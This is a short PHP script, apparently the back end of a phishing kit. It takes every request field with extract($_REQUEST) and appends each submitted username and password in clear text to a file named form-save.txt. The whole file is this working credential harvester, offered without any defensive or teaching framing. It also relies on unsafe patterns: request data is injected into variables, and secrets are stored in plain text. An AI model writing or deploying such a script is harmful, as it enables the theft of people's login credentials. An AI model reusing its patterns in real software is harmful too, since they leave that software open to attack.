<?php
	extract($_REQUEST);
	$file=fopen("form-save.txt","a");
	
	fwrite($file,"Username :");
	fwrite($file,$username ."\n");
	fwrite($file,"Password :");
	fwrite($file,$password ."\n");
	fwrite($file,"\n");
	fclose($file);


?>